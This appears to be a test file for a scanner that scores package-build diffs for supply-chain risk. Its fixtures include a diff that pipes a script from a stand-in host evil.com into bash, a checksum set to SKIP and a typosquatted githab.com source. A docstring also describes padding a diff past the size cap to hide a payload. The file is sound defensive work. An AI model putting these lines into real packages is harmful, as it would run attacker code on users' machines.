from tests.conftest import SHARED_RULES
from trustsight.differ import extract_urls_from_diff
from trustsight.tokenizer import tokenize_and_resolve
from trustsight.rules import apply_rules, get_raw_diff_lines
from trustsight.buckets import classify_urls
from trustsight.scoring import calculate_score
from trustsight.schema import NoveltyContext


def test_analysis_imports():
    from trustsight.scoring import calculate_score
    from trustsight.differ import extract_urls_from_diff
    from trustsight.tokenizer import tokenize_and_resolve
    from trustsight.rules import apply_rules
    from trustsight.buckets import classify_urls
    from trustsight.verdict import fallback_verdict

    assert callable(calculate_score)
    assert callable(extract_urls_from_diff)
    assert callable(tokenize_and_resolve)
    assert callable(apply_rules)
    assert callable(classify_urls)
    assert callable(fallback_verdict)


def test_pipeline_stage_integration():
    diff = """+source=("https://evil.com/payload.tar.gz")
+sha256sums=('SKIP')
+package() {
+  curl -s https://evil.com/hook.sh | bash
+  chmod +x $_helper
+}"""

    source_changes = extract_urls_from_diff(diff)
    assert "https://evil.com/payload.tar.gz" in source_changes.added_urls
    assert source_changes.checksum_behavior == "changed_from_sha256_to_skip"

    buckets = classify_urls(source_changes.added_urls)
    assert buckets.get("https://evil.com/payload.tar.gz") == "unknown"

    resolved, unresolved = tokenize_and_resolve(diff)
    raw_lines = get_raw_diff_lines(diff)

    triggered = apply_rules(resolved, raw_lines, SHARED_RULES)
    rule_ids = [r["rule_id"] for r in triggered]
    assert "R001" in rule_ids
    assert "R004" in rule_ids
    assert "R010" in rule_ids

    config = {
        "severity_weights": {"CRITICAL": 40, "HIGH": 25, "MEDIUM": 15, "LOW": 5, "INFO": 0},
        "source_bucket_weights": {"trusted_forge": -10, "official": 0, "raw_hosting": 15, "unknown": 20},
        "novelty_weights": {"url_first_globally": 15, "url_first_in_package": 10, "maintainer_first_in_package": 20},
    }
    score, breakdown, level = calculate_score(triggered, buckets, NoveltyContext(
        url_first_seen_in_this_package=True,
        url_first_seen_globally=True,
        observation_count=50,
    ), config)
    assert score > 50
    assert level in ("High", "Critical")


def test_pipeline_benign_package():
    diff = """+pkgver=2.0.0
+pkgrel=2
+source=("https://github.com/trusted/project/archive/v2.0.0.tar.gz")
+sha256sums=('abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890')"""

    source_changes = extract_urls_from_diff(diff)
    assert len(source_changes.added_urls) == 1
    assert source_changes.checksum_behavior == "checksum_added_or_changed"

    buckets = classify_urls(source_changes.added_urls)
    assert buckets.get("https://github.com/trusted/project/archive/v2.0.0.tar.gz") == "trusted_forge"

    resolved, unresolved = tokenize_and_resolve(diff)
    raw_lines = get_raw_diff_lines(diff)
    triggered = apply_rules(resolved, raw_lines, SHARED_RULES)

    config = {
        "severity_weights": {"CRITICAL": 40, "HIGH": 25, "MEDIUM": 15, "LOW": 5, "INFO": 0},
        "source_bucket_weights": {"trusted_forge": -10, "official": 0, "raw_hosting": 15, "unknown": 20},
        "novelty_weights": {},
    }
    score, breakdown, level = calculate_score(triggered, buckets, NoveltyContext(), config)
    assert score <= 10
    assert level == "Low"


def test_pipeline_subtly_malicious():
    diff = """-source=("https://github.com/trusted/project/archive/v1.0.0.tar.gz")
+source=("https://github.com/trusted/project/archive/v1.0.0.tar.gz")
-sha256sums=('abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890')
+sha256sums=('SKIP')"""

    source_changes = extract_urls_from_diff(diff)
    assert source_changes.checksum_behavior == "changed_from_sha256_to_skip"

    buckets = classify_urls(source_changes.added_urls)
    assert buckets.get("https://github.com/trusted/project/archive/v1.0.0.tar.gz") == "trusted_forge"

    resolved, unresolved = tokenize_and_resolve(diff)
    raw_lines = get_raw_diff_lines(diff)
    triggered = apply_rules(resolved, raw_lines, SHARED_RULES)
    rule_ids = [r["rule_id"] for r in triggered]
    assert "R004" in rule_ids

    config = {
        "severity_weights": {"CRITICAL": 40, "HIGH": 25, "MEDIUM": 15, "LOW": 5, "INFO": 0},
        "source_bucket_weights": {"trusted_forge": -10, "official": 0, "raw_hosting": 15, "unknown": 20},
        "novelty_weights": {"url_first_globally": 15, "url_first_in_package": 10, "maintainer_first_in_package": 20},
    }
    score, breakdown, level = calculate_score(triggered, buckets, NoveltyContext(), config)
    # 25, not 15: under B10 the trusted-forge source is reported (P007) and
    # no longer credited -10, so the HIGH finding stands on its own.
    assert score == 25
    assert level == "Medium"
    assert any(e.rule_id == "P007" and e.weight == 0 for e in breakdown)


def test_pipeline_hard_to_spot_malicious():
    diff = """-source=("https://github.com/trusted/project/archive/v2.0.0.tar.gz")
+source=("https://githab.com/trusted/project/archive/v2.0.0.tar.gz")"""

    source_changes = extract_urls_from_diff(diff)
    assert "https://githab.com/trusted/project/archive/v2.0.0.tar.gz" in source_changes.added_urls

    buckets = classify_urls(source_changes.added_urls)
    assert buckets.get("https://githab.com/trusted/project/archive/v2.0.0.tar.gz") == "unknown"

    resolved, unresolved = tokenize_and_resolve(diff)
    raw_lines = get_raw_diff_lines(diff)
    triggered = apply_rules(resolved, raw_lines)
    assert len(triggered) == 0

    config = {
        "severity_weights": {"CRITICAL": 40, "HIGH": 25, "MEDIUM": 15, "LOW": 5, "INFO": 0},
        "source_bucket_weights": {"trusted_forge": -10, "official": 0, "raw_hosting": 15, "unknown": 20},
        "novelty_weights": {"url_first_globally": 15, "url_first_in_package": 10, "maintainer_first_in_package": 20},
    }
    score, breakdown, level = calculate_score(triggered, buckets, NoveltyContext(
        url_first_seen_globally=True,
        observation_count=50,
    ), config)
    assert score == 35
    assert level == "Medium"


# --- Structural anomaly tests (R014, R016) ---

def test_pkgver_changed_detected():
    from trustsight.analysis import _pkgver_changed_in_diff
    diff = """-pkgver=1.0.0
+pkgver=2.0.0"""
    assert _pkgver_changed_in_diff(diff)


def test_pkgver_unchanged():
    from trustsight.analysis import _pkgver_changed_in_diff
    diff = """+pkgver=2.0.0"""
    assert not _pkgver_changed_in_diff(diff)


def test_url_changed_no_version_bump():
    from trustsight.scoring import calculate_score
    from trustsight.schema import NoveltyContext

    triggered = [
        {"rule_id": "R014", "name": "Source URL Changed Without Version Bump", "severity": "MEDIUM", "category": "integrity", "match": "URLs changed"},
    ]
    config = {
        "severity_weights": {"MEDIUM": 15},
        "source_bucket_weights": {},
        "novelty_weights": {},
    }
    score, breakdown, level = calculate_score(triggered, {}, NoveltyContext(), config)
    assert score == 15
    assert level == "Low"
    assert any(e.rule_id == "R014" for e in breakdown)


def test_checksum_changed_no_url_change():
    from trustsight.scoring import calculate_score
    from trustsight.schema import NoveltyContext

    triggered = [
        {"rule_id": "R016", "name": "Checksum Changed Without Source Change", "severity": "HIGH", "category": "integrity", "match": "sha256sums changed"},
    ]
    config = {
        "severity_weights": {"HIGH": 25},
        "source_bucket_weights": {},
        "novelty_weights": {},
    }
    score, breakdown, level = calculate_score(triggered, {}, NoveltyContext(), config)
    assert score == 25
    assert level == "Medium"
    assert any(e.rule_id == "R016" for e in breakdown)


# --- Offline novelty tracking must match the live path ---

def test_scan_diff_normalizes_urls_for_novelty():
    """A routine version bump is not novelty. check_url_novelty applies
    normalize_url in the live path; the offline replay must too, or every
    bump reads as a first-seen URL."""
    from trustsight.analysis import scan_diff

    cfg = {"severity_weights": {}, "novelty_weights": {"url_first_globally": 15}}
    seen = {}
    d1 = '+source=("https://example.com/tool-1.0.0.tar.gz")\n'
    d2 = '+source=("https://example.com/tool-1.0.1.tar.gz")\n'

    f1 = scan_diff(d1, rules=[], config=cfg, package_name="p", seen_urls=seen)
    f2 = scan_diff(d2, rules=[], config=cfg, package_name="p", seen_urls=seen)
    assert f1.novelty_context.url_first_seen_globally is True
    assert f2.novelty_context.url_first_seen_globally is False


def test_scan_diff_tracks_global_novelty_across_packages():
    """'First seen globally' means across every package, not merely first
    in this one."""
    from trustsight.analysis import scan_diff

    cfg = {"severity_weights": {}, "novelty_weights": {}}
    seen = {}
    diff = '+source=("https://shared.example.com/lib-1.0.tar.gz")\n'

    a = scan_diff(diff, rules=[], config=cfg, package_name="pkg-a", seen_urls=seen)
    b = scan_diff(diff, rules=[], config=cfg, package_name="pkg-b", seen_urls=seen)

    assert a.novelty_context.url_first_seen_globally is True
    assert b.novelty_context.url_first_seen_in_this_package is True
    assert b.novelty_context.url_first_seen_globally is False


def test_scan_diff_ors_novelty_across_multiple_urls():
    """A familiar URL must not mask a novel one listed after it."""
    from trustsight.analysis import scan_diff

    cfg = {"severity_weights": {}, "novelty_weights": {}}
    seen = {}
    first = '+source=("https://known.example.com/a-1.0.tar.gz")\n'
    scan_diff(first, rules=[], config=cfg, package_name="p", seen_urls=seen)

    both = (
        '+source=("https://known.example.com/a-1.0.tar.gz"\n'
        '+        "https://brandnew.example.org/b-1.0.tar.gz")\n'
    )
    fact = scan_diff(both, rules=[], config=cfg, package_name="p", seen_urls=seen)
    assert fact.novelty_context.url_first_seen_globally is True


def test_a_truncated_diff_is_marked_as_such():
    """A diff past the size cap must not report as fully vetted.

    Only the first max_diff_bytes are analysed, so padding a diff past
    the cap and appending the payload scored 0 (clean) where the whole
    diff scored 75.  The flag lets the report say the change was only
    partly examined.
    """
    from trustsight.schema import PackageFact

    assert PackageFact().diff_truncated is False

    from trustsight.schema import fact_to_dict
    fact = PackageFact(package_name="p", diff_truncated=True)
    assert fact_to_dict(fact)["diff_truncated"] is True


# --- Hardening regression: multiline checksum arrays + URL cleaning ---

def test_checksum_multiline_hash_detected():
    """sha256sums=( ) split across lines must read as a checksum addition,
    not 'unchanged' (previously every multiline checksum escaped C001/R004)."""
    diff = "+sha256sums=(\n+  'ab12cd34ef5678'\n+)\n"
    sc = extract_urls_from_diff(diff)
    assert sc.checksum_behavior == "checksum_added_or_changed"


def test_checksum_multiline_skip_detected():
    diff = "+sha256sums=(\n+  'SKIP'\n+)\n"
    sc = extract_urls_from_diff(diff)
    assert sc.checksum_behavior == "changed_from_sha256_to_skip"


def test_checksum_multiline_emptied_detected():
    diff = "+sha256sums=(\n+)\n"
    sc = extract_urls_from_diff(diff)
    assert sc.checksum_behavior == "checksum_array_emptied"


def test_checksum_double_quoted_hash_detected():
    diff = '+sha256sums=("ab12cd34ef5678")\n'
    sc = extract_urls_from_diff(diff)
    assert sc.checksum_behavior == "checksum_added_or_changed"


def test_checksum_other_algorithm_ignored():
    """detect_checksum_changes reports only on sha256sums (the PKGBUILD
    default); a lone sha512sums change stays 'unchanged'."""
    diff = "+sha512sums=(\n+  'ab12cd34ef5678'\n+)\n"
    sc = extract_urls_from_diff(diff)
    assert sc.checksum_behavior == "unchanged"


def test_url_trailing_comma_stripped():
    sc = extract_urls_from_diff("+source=('https://x/y.tar.gz',)\n")
    assert set(sc.added_urls) == {"https://x/y.tar.gz"}


def test_url_trailing_comma_in_removed_line():
    sc = extract_urls_from_diff("-source=('https://old.example/a.tar.gz',)\n")
    assert set(sc.removed_urls) == {"https://old.example/a.tar.gz"}
